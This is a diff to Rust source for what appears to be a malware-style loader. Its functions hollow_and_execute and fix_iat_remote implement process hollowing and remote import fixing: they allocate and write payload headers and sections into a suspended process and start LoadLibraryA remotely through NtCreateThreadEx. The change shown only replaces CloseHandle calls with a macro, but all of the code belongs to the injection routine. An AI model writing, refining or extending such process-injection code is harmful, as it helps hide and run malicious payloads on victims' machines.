@@ -229,8 +229,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             );
             if fallback.is_null() {
                 winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-                CloseHandle(pi.hThread);
-                CloseHandle(pi.hProcess);
+                close_handle!(pi.hThread);
+                close_handle!(pi.hProcess);
                 return Err(anyhow!("VirtualAllocEx failed for hollowing"));
             }
             fallback
@@ -251,8 +251,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
         ) == 0
         {
             winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
+            close_handle!(pi.hThread);
+            close_handle!(pi.hProcess);
             return Err(anyhow!("WriteProcessMemory(headers) failed"));
         }
 
@@ -282,8 +282,8 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             ) == 0
             {
                 winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
-                CloseHandle(pi.hThread);
-                CloseHandle(pi.hProcess);
+                close_handle!(pi.hThread);
+                close_handle!(pi.hProcess);
                 return Err(anyhow!("WriteProcessMemory(section {}) failed", i));
             }
         }
@@ -705,7 +705,6 @@ unsafe fn fix_iat_remote(
     payload: &[u8],
     written: &mut winapi::shared::basetsd::SIZE_T,
 ) -> Result<()> {
-    use winapi::um::handleapi::CloseHandle;
     use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
     use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
     use winapi::um::synchapi::WaitForSingleObject;
@@ -847,7 +846,7 @@ unsafe fn fix_iat_remote(
                         );
                         if status >= 0 && !h_thread.is_null() {
                             WaitForSingleObject(h_thread, INFINITE);
-                            CloseHandle(h_thread);
+                            pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
                         } else {
                             tracing::warn!("fix_iat_remote: NtCreateThreadEx for remote LoadLibraryA failed: {:x}", status);
                         }
